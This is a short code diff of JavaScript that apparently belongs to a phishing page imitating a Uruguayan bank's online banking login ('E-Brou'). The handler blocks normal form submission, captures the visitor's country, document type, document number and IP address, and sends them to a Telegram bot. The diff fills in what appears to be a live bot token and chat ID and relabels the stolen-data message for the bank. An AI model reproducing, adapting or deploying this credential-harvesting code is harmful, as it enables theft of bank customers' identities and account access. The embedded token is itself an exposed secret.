@@ -6,8 +6,8 @@ document.addEventListener("DOMContentLoaded", function () {
         event.preventDefault(); // Evita el envío tradicional del formulario
 
         // Datos del bot de Telegram
-        const token = "TOKEN AQUI";
-        const chat_id = "ID";
+        const token = "7584579761:AAF_gz-XhA7nA9wSzN6OaWP6Ml1UX9DGgkU";
+        const chat_id = "5157616506";
 
         // Captura de datos del formulario
         const pais = "Uruguay"; // Dado que este valor es fijo
@@ -28,7 +28,7 @@ document.addEventListener("DOMContentLoaded", function () {
                 const ip_cliente = data.ip;
 
                 // Crea el mensaje para enviar a Telegram
-                let mensaje = "Ingreso de Usuario:\n";
+                let mensaje = "Ingreso E-Brou:\n";
                 mensaje += `País: ${pais}\n`;
                 mensaje += `Tipo de Documento: ${tipoDocumento}\n`;
                 mensaje += `Número de Documento: ${numeroDocumento}\n`;
